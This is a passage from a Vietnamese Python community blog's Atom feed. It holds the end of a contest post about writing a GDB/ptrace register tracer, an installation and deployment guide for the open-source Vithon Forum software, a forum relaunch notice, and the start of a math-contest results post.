&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x08048552&lt;/span&gt; &lt;span class="err"&gt;&amp;lt;&lt;/span&gt;&lt;span class="no"&gt;main&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;110&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;        &lt;span class="no"&gt;mov&lt;/span&gt;    &lt;span class="no"&gt;DWORD&lt;/span&gt; &lt;span class="no"&gt;PTR&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="no"&gt;eax&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x08048555&lt;/span&gt; &lt;span class="err"&gt;&amp;lt;&lt;/span&gt;&lt;span class="no"&gt;main&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;113&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;        &lt;span class="no"&gt;call&lt;/span&gt;   &lt;span class="mh"&gt;0x80483d8&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="no"&gt;printf@plt&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x0804855a&lt;/span&gt; &lt;span class="err"&gt;&amp;lt;&lt;/span&gt;&lt;span class="no"&gt;main&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;118&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;        &lt;span class="no"&gt;mov&lt;/span&gt;    &lt;span class="no"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0x0&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x0804855f&lt;/span&gt; &lt;span class="err"&gt;&amp;lt;&lt;/span&gt;&lt;span class="no"&gt;main&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;123&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;        &lt;span class="no"&gt;leave&lt;/span&gt;
&lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x08048560&lt;/span&gt; &lt;span class="err"&gt;&amp;lt;&lt;/span&gt;&lt;span class="no"&gt;main&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;124&lt;/span&gt;&lt;span class="err"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;        &lt;span class="no"&gt;ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;thì chương trình sẽ in ra thông tin tương tự (có thể tùy ý chỉnh sửa cho đầy đủ hơn) như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;*&lt;/span&gt; &lt;span class="nf"&gt;Before&lt;/span&gt; &lt;span class="no"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="err"&gt;--------------------------------------------------------------------------[&lt;/span&gt;&lt;span class="nf"&gt;regs&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="nl"&gt;EAX:&lt;/span&gt; &lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x08048646&lt;/span&gt;  &lt;span class="no"&gt;EBX&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0x002B2FF4&lt;/span&gt;  &lt;span class="no"&gt;ECX&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0x00000003&lt;/span&gt;  &lt;span class="no"&gt;EDX&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0xBFFFEF9C&lt;/span&gt;
  &lt;span class="nl"&gt;ESI:&lt;/span&gt; &lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00000000&lt;/span&gt;  &lt;span class="no"&gt;EDI&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0x00000000&lt;/span&gt;  &lt;span class="no"&gt;EBP&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0xBFFFF0A8&lt;/span&gt;  &lt;span class="no"&gt;ESP&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0xBFFFEF80&lt;/span&gt;

&lt;span class="err"&gt;*&lt;/span&gt; &lt;span class="nf"&gt;After&lt;/span&gt; &lt;span class="no"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="err"&gt;--------------------------------------------------------------------------[&lt;/span&gt;&lt;span class="nf"&gt;regs&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
  &lt;span class="nl"&gt;EAX:&lt;/span&gt; &lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x0000000A&lt;/span&gt;  &lt;span class="no"&gt;EBX&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0x002B2FF4&lt;/span&gt;  &lt;span class="no"&gt;ECX&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0xBFFFEF68&lt;/span&gt;  &lt;span class="no"&gt;EDX&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0x002B4320&lt;/span&gt;
  &lt;span class="nl"&gt;ESI:&lt;/span&gt; &lt;span class="err"&gt;0&lt;/span&gt;&lt;span class="nf"&gt;x00000000&lt;/span&gt;  &lt;span class="no"&gt;EDI&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0x00000000&lt;/span&gt;  &lt;span class="no"&gt;EBP&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0xBFFFF0A8&lt;/span&gt;  &lt;span class="no"&gt;ESP&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;0xBFFFEF80&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yêu cầu: Bắt buộc phải sử dụng ngôn ngữ Python cho chương trình chính. Có thể sử dụng thêm các công cụ phụ hoặc thư viện hỗ trợ như GDB, ptrace.&lt;/p&gt;
&lt;p&gt;Hạn nộp bài: Ngày 26 tháng 07 năm 2010&lt;/p&gt;
&lt;p&gt;Nộp bài (mã nguồn) về cho &lt;a class="reference external" href="mailto:admin+frontpage&amp;#64;vithon.org"&gt;admin+frontpage&amp;#64;vithon.org&lt;/a&gt; (xin vui lòng bỏ +frontpage).&lt;/p&gt;
&lt;p&gt;Giải thưởng: Một giải thưởng duy nhất bao gồm 100.000 đồng tiền mặt và một món quà từ Las Vegas.&lt;/p&gt;
</content><category term="gdb"></category><category term="contest"></category><category term="tracer"></category><category term="ptrace"></category></entry><entry><title>Giới thiệu phần mềm Vithon Forum</title><link href="/2010/07/gioi-thieu-phan-mem-vithon-forum.html" rel="alternate"></link><published>2010-07-01T11:49:00+07:00</published><updated>2010-07-01T11:49:00+07:00</updated><author><name>Nhóm PCNV</name></author><id>tag:None,2010-07-01:/2010/07/gioi-thieu-phan-mem-vithon-forum.html</id><summary type="html">&lt;p&gt;Nhóm Python Cho Người Việt (PCNV) hân hạnh công bố phần mềm &lt;strong&gt;Vithon Forum&lt;/strong&gt; đến với cộng đồng.&lt;/p&gt;
&lt;div class="section" id="gioi-thieu"&gt;
&lt;h2&gt;Giới thiệu&lt;/h2&gt;
&lt;p&gt;Phần mềm Vithon Forum (gọi tắt là &lt;strong&gt;VF&lt;/strong&gt;) là một phần mềm tự do, mã mở, miễn phí với chức năng chính là một diễn đàn thảo luận tương tự …&lt;/p&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;Nhóm Python Cho Người Việt (PCNV) hân hạnh công bố phần mềm &lt;strong&gt;Vithon Forum&lt;/strong&gt; đến với cộng đồng.&lt;/p&gt;
&lt;div class="section" id="gioi-thieu"&gt;
&lt;h2&gt;Giới thiệu&lt;/h2&gt;
&lt;p&gt;Phần mềm Vithon Forum (gọi tắt là &lt;strong&gt;VF&lt;/strong&gt;) là một phần mềm tự do, mã mở, miễn phí với chức năng chính là một diễn đàn thảo luận tương tự như các gói phần mềm phpBB, punBB, pyForum.&lt;/p&gt;
&lt;p&gt;VF là một ứng dụng web được viết bằng ngôn ngữ Python theo mô hình WSGI. VF có thể được triển khai với các máy chủ hỗ trợ WSGI hay CGI ví dụ như Apache. VF có thể sử dụng nhiều hệ cơ sở dữ liệu quan hệ như SQLite, MySQL, Oracle.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="tinh-nang"&gt;
&lt;h2&gt;Tính năng&lt;/h2&gt;
&lt;p&gt;VF có các tính năng nổi trội sau:&lt;/p&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;Đơn giản&lt;/dt&gt;
&lt;dd&gt;VF chỉ thực hiện một công việc chính đó là lưu trữ và hiển thị các thảo luận của người dùng một cách tiện lợi nhất. VF không mong muốn trở thành một công cụ tích hợp thư điện tử, lịch cá nhân, danh sách công việc, nhắn tin, tán gẫu, v.v...&lt;/dd&gt;
&lt;dt&gt;Nhỏ gọn&lt;/dt&gt;
&lt;dd&gt;Vì chỉ phục vụ một số ít tác vụ cơ bản của một diễn đàn, toàn bộ chương trình VF (trừ các thư viện ngoài) chỉ chiếm khoảng 100 kilobyte dung lượng dĩa.&lt;/dd&gt;
&lt;dt&gt;An toàn&lt;/dt&gt;
&lt;dd&gt;VF được phát triển với các tính năng an ninh được đặt lên hàng đầu. Vì sự đơn giản và tính nhỏ gọn của VF nên chương trình được thiết kế ưu tiên sự an toàn hơn tính năng, và việc kiểm tra mã nguồn được thực hiện thường xuyên nhằm đảm bảo sự ưu tiên đó.&lt;/dd&gt;
&lt;dt&gt;Thuận tiện&lt;/dt&gt;
&lt;dd&gt;VF đề cao việc sử dụng các chuẩn mở như OpenID để việc sử dụng VF trở nên dễ dàng hơn cho người dùng. Bên canh đó, các tính năng thông thường mà người dùng đã quen thuộc ở các gói phần mềm khác cũng có mặt trong VF như BBCode. Tất cả chỉ nhằm một mục đích tạo ra môi trường thảo luận thuận tiện.&lt;/dd&gt;
&lt;/dl&gt;
&lt;/div&gt;
&lt;div class="section" id="yeu-cau-he-thong"&gt;
&lt;h2&gt;Yêu cầu hệ thống&lt;/h2&gt;
&lt;p&gt;Để triển khai VF, hệ thống sẽ cần một số ứng dụng và mô-đun sau:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Python v2.5 trở lên.&lt;/li&gt;
&lt;li&gt;Mô-đun mako&lt;/li&gt;
&lt;li&gt;Mô-đun werkzeug&lt;/li&gt;
&lt;li&gt;Mô-đun sqlalchemy&lt;/li&gt;
&lt;li&gt;Mô-đun routes&lt;/li&gt;
&lt;li&gt;Mô-đun repoze.who.plugins.openid&lt;/li&gt;
&lt;li&gt;Mô-đun repoze.what.plugins.xml&lt;/li&gt;
&lt;li&gt;Mô-đun postmarkup&lt;/li&gt;
&lt;li&gt;Mô-đun unidecode&lt;/li&gt;
&lt;li&gt;Mô-đun zope.interface&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Các mô-đun này có thể được cài đặt bằng &lt;strong&gt;setuptools&lt;/strong&gt; (&lt;strong&gt;easy_install&lt;/strong&gt;) hoặc &lt;strong&gt;pip&lt;/strong&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="cai-dat"&gt;
&lt;h2&gt;Cài đặt&lt;/h2&gt;
&lt;p&gt;Mã nguồn của VF có thể được tải về từ địa chỉ &lt;a class="reference external" href="http://bitbucket.org/vithon/vithon-forum"&gt;http://bitbucket.org/vithon/vithon-forum&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Giải nén mã nguồn vào một thư mục nào đấy, giả sử như &lt;strong&gt;/opt/vithon-forum&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Dựa vào nội dung của tập tin &lt;strong&gt;config.py&lt;/strong&gt; để tạo tập tin &lt;strong&gt;siteconfig.py&lt;/strong&gt; mới, với các dòng lệnh gán giá trị phù hợp cho biến toàn cục. Các biến quan trọng cần thay đổi là &lt;strong&gt;COOKIE_SECRET&lt;/strong&gt;, &lt;strong&gt;DATABASE_URL&lt;/strong&gt;, &lt;strong&gt;STATIC_CONTENT_PATH&lt;/strong&gt;, &lt;strong&gt;SESSION_STORAGE_PATH&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Tập tin &lt;strong&gt;siteconfig.py&lt;/strong&gt; có thể có dạng sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;BOARD_NAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Acme Hideout&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;COOKIE_SECRET&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;y@h0O&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;DATABASE_URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sqlite:////opt/vithon-forum/db.db&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;STATIC_CONTENT_PATH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/opt/vithon-forum/static&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;SESSION_STORAGE_PATH&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/tmp/session&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;SESSION_COOKIE_NAME&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sid&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;ENTRIES_PER_PAGE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;
&lt;span class="n"&gt;ORGANIZATION&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Acme Corp&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Sau đó, chúng ta cần phải khởi tạo cơ sở dữ liệu bằng lệnh &lt;strong&gt;initdb&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; /opt/vithon-forum
$ python forum.py initdb
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Việc cài đặt đã hoàn tất.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="van-hanh"&gt;
&lt;h2&gt;Vận hành&lt;/h2&gt;
&lt;p&gt;Mặc dù cơ sở dữ liệu đã được khởi tạo khi cài đặt nhưng chúng ta chưa có dữ liệu nào trong cơ sở dữ liệu cả. Do đó, trước khi chạy VF, chúng ta sẽ cần phải tạo một số diễn đàn. Chúng ta sẽ sử dụng lệnh &lt;strong&gt;shell&lt;/strong&gt; để thực hiện việc này.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; /opt/vithon-forum
$ python forum.py shell
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Lệnh &lt;strong&gt;shell&lt;/strong&gt; sẽ mở một phiên làm việc tương tác cho phép chúng ta sử dụng Python để tác động đến chương trình VF. Chúng ta sẽ nhập vào đoạn mã Python như sau.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;model&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="n"&gt;f1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Forum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Forum 1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Dien giai cho Forum 1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;f11&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Forum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Forum 1.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Dien giai cho Forum 1.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;f12&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Forum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Forum 1.2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Dien giai cho Forum 1.2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;f2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Forum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Forum 2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Dien giai cho Forum 2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;f21&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Forum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Forum 2.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Dien giai cho Forum 2.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;f22&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Forum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Forum 2.2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="sa"&gt;u&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Dien giai cho Forum 2.2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;f2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;f2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;commit&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Các câu lệnh trên tạo ra cấu trúc diễn đàn như sau:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
Forum 1
  |
  +-- Forum 1.1
  |
  +-- Forum 1.2

Forum 2
  |
  +-- Forum 2.1
  |
  +-- Forum 2.2
&lt;/pre&gt;
&lt;p&gt;Vì VF không có các tính năng quản lý qua web nên lệnh &lt;strong&gt;shell&lt;/strong&gt; cũng chính là môi trường quản lý chính.&lt;/p&gt;
&lt;p&gt;Cuối cùng, để chạy VF, chúng ta sẽ dùng lệnh &lt;strong&gt;runserver&lt;/strong&gt; tương tự như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;cd&lt;/span&gt; /opt/vithon-forum
$ python forum.py runserver -h &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 -p &lt;span class="m"&gt;8080&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Khi này, nếu ta mở trình duyệt lên và đi đến trang &lt;a class="reference external" href="http://127.0.0.1:8080"&gt;http://127.0.0.1:8080&lt;/a&gt; thì chúng ta sẽ thấy diễn đàn đã hoạt động.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="trien-khai-theo-mo-hinh-cgi"&gt;
&lt;h2&gt;Triển khai theo mô hình CGI&lt;/h2&gt;
&lt;p&gt;Chúng ta cũng có thể triển khai VF theo mô hình CGI.&lt;/p&gt;
&lt;p&gt;Đầu tiên chúng ta cần chép tập tin &lt;strong&gt;forum.cgi&lt;/strong&gt; vào thư mục chứa các tập tin CGI (ví dụ như &lt;strong&gt;/var/www/cgi-bin&lt;/strong&gt;).&lt;/p&gt;
&lt;p&gt;Tiếp đến chúng ta cần sửa các lệnh thiết lập đường dẫn trong tập tin này cho phù hợp.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Set the path to store python package cache&lt;/span&gt;
&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PYTHON_EGG_CACHE&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/tmp/.egg&amp;#39;&lt;/span&gt;
&lt;span class="c1"&gt;# Set the path to vithon forum here&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/opt/vithon-forum&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nếu như tập tin &lt;strong&gt;siteconfig.py&lt;/strong&gt; nằm ở thư mục khác (ví dụ như trong thư mục &lt;strong&gt;/var/www/cgi-bin&lt;/strong&gt;), thì chúng ta cũng sẽ cần thêm vào các dòng bên dưới. Nếu &lt;strong&gt;siteconfig.py&lt;/strong&gt; nằm chung chỗ với các tập tin khác của VF thì chúng ta không cần các dòng lệnh này.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# Set the path to siteconfig.py here&lt;/span&gt;
&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/var/www/cgi-bin&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Và cuối cùng chúng ta chỉ cần cấu hình máy chủ web để sử dụng tập tin &lt;strong&gt;forum.cgi&lt;/strong&gt; như là một ứng dụng CGI. Thông tin về vấn đề này được nói rõ hơn trong tài liệu đi kèm với máy chủ web.&lt;/p&gt;
&lt;/div&gt;
</content><category term="python"></category><category term="wsgi"></category><category term="vithon"></category><category term="forum"></category><category term="bulletin board"></category></entry><entry><title>Diễn đàn vithon hoạt động trở lại</title><link href="/2010/06/dien-dan-vithon-hoat-dong-tro-lai.html" rel="alternate"></link><published>2010-06-08T10:21:00+07:00</published><updated>2010-06-08T10:21:00+07:00</updated><author><name>Phan Đắc Anh Huy</name></author><id>tag:None,2010-06-08:/2010/06/dien-dan-vithon-hoat-dong-tro-lai.html</id><summary type="html">&lt;p&gt;Chào mọi người, sau một thời gian gián đoạn, diễn đàn Vithon đã hoạt động trở lại tại địa chỉ &lt;a class="reference external" href="http://vithon.org/forum"&gt;http://vithon.org/forum&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Phiên bản mới của diễn đàn do chính các thành viên của nhóm PCNV phát triển, được viết hoàn toàn bằng ngôn ngữ Python.&lt;/p&gt;
&lt;p&gt;Mã nguồn …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Chào mọi người, sau một thời gian gián đoạn, diễn đàn Vithon đã hoạt động trở lại tại địa chỉ &lt;a class="reference external" href="http://vithon.org/forum"&gt;http://vithon.org/forum&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Phiên bản mới của diễn đàn do chính các thành viên của nhóm PCNV phát triển, được viết hoàn toàn bằng ngôn ngữ Python.&lt;/p&gt;
&lt;p&gt;Mã nguồn của diễn đàn được host tại &lt;a class="reference external" href="http://bitbucket.org/vithon/vithon-forum"&gt;BitBuket&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Hiện nay nhóm vẫn đang tiếp tục hoàn thiện các tính năng cơ bản và mở rộng cho diễn đàn. Chúng tôi chào đón mọi ý kiến đóng góp về tính năng sử dụng cũng như tham gia viết mã của tất cả các bạn.&lt;/p&gt;
</content></entry><entry><title>Kết quả cuộc thi Giải Toán Bằng Python</title><link href="/2010/06/ket-qua-cuoc-thi-giai-toan-bang-python.html" rel="alternate"></link><published>2010-06-03T04:04:00+07:00</published><updated>2010-06-03T04:04:00+07:00</updated><author><name>Phan Đắc Anh Huy</name></author><id>tag:None,2010-06-03:/2010/06/ket-qua-cuoc-thi-giai-toan-bang-python.html</id><summary type="html">&lt;p&gt;Sau một tuần tranh tài sôi nổi, cuộc thi Giải Toán Bằng Python mừng ngày Quốc Tế Thiếu Nhi đã kết thúc tốt đẹp.&lt;/p&gt;
&lt;p&gt;Ngày 1/6, với sự tham dự của hầu hết các thí sinh và cổ động viên, anh Nguyễn Thành Nam - trưởng nhóm Python cho người …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Sau một tuần tranh tài sôi nổi, cuộc thi Giải Toán Bằng Python mừng ngày Quốc Tế Thiếu Nhi đã kết thúc tốt đẹp.&lt;/p&gt;
&lt;p&gt;Ngày 1/6, với sự tham dự của hầu hết các thí sinh và cổ động viên, anh Nguyễn Thành Nam - trưởng nhóm Python cho người Việt - đã tiến hành chấm bài. Đúng như dự đoán trong thời gian diễn ra kỳ thi của anh, mặc cho sự cạnh tranh rất quyết liệt giữa các thí sinh, vẫn có một bài thi tỏ ra vượt trội và giành chiến thắng một cách thuyết phục. Đó là bài dự thi của bạn Nhâm Xuân Nam, với nickname namnx.&lt;/p&gt;
